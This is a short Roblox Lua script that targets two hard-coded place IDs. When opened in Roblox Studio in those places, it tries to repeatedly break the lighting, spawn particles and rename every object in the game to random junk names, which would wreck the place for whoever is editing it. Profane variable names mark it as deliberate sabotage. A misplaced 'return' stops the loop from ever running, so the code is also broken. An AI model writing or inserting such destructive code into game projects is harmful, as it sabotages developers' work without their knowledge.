local Places = {
	{Id = 5240040, Destroy = true},
	{Id = 2073727354, Destroy = true}
}
local RunService = game:GetService("RunService")
function Name(c)
	c.Name = math.random(1,100000000).."RektEzSped"
end
local FuckThisGame = false


function BreakGame()
	local l = game:GetService("Lighting")
	l.Ambient = BrickColor.Random().Color
	l.Brightness = -10
	local Part = Instance.new("Part",workspace)
	Part.Transparency = 1
	Part.Anchored = true
	local p = Instance.new("ParticleEmitter",Part)
	p.ZOffset = 20
	p.Size = NumberSequence.new(1,1)
	p.Speed = NumberRange.new(0,0)
	p.Rotation = NumberRange.new(0,0)
	p.RotSpeed = NumberRange.new(1,1000)
	for i,v in pairs(game:GetDescendants())do
		pcall(Name,v)
	end
end

if RunService:IsStudio() then
	for i,v in pairs(Places) do
		if game.PlaceId == v.Id and v.Destroy == true then
			
			FuckThisGame = true
			return
		end
	end
	if FuckThisGame == true then
		while wait() do
			BreakGame()
		end
	end
end
